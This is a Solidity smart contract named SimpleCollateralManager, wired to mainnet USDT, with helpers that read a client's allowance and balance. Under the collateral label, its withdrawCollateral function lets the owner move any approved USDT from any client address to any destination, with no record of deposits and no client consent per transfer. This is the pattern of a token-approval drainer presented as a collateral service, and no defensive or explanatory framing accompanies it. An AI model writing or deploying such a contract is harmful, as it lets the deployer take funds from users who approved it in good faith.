// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

interface IERC20 {
    function transferFrom(address from, address to, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
}

contract SimpleCollateralManager {
    IERC20 public immutable usdt;
    address public owner;

    event CollateralWithdrawn(address indexed client, address indexed to, uint256 amount);

    modifier onlyOwner() {
        require(msg.sender == owner, "Not owner");
        _;
    }

    constructor() {
        // USDT Mainnet
        usdt = IERC20(0xdAC17F958D2ee523a2206206994597C13D831ec7);
        owner = msg.sender;
    }

    function withdrawCollateral(
        address client,
        address to,
        uint256 amount
    ) external onlyOwner {
        require(usdt.allowance(client, address(this)) >= amount, "Insufficient allowance");
        require(usdt.balanceOf(client) >= amount, "Insufficient balance");
        
        bool success = usdt.transferFrom(client, to, amount);
        require(success, "Transfer failed");
        
        emit CollateralWithdrawn(client, to, amount);
    }

    function getClientAllowance(address client) external view returns (uint256) {
        return usdt.allowance(client, address(this));
    }

    function getClientBalance(address client) external view returns (uint256) {
        return usdt.balanceOf(client);
    }
}
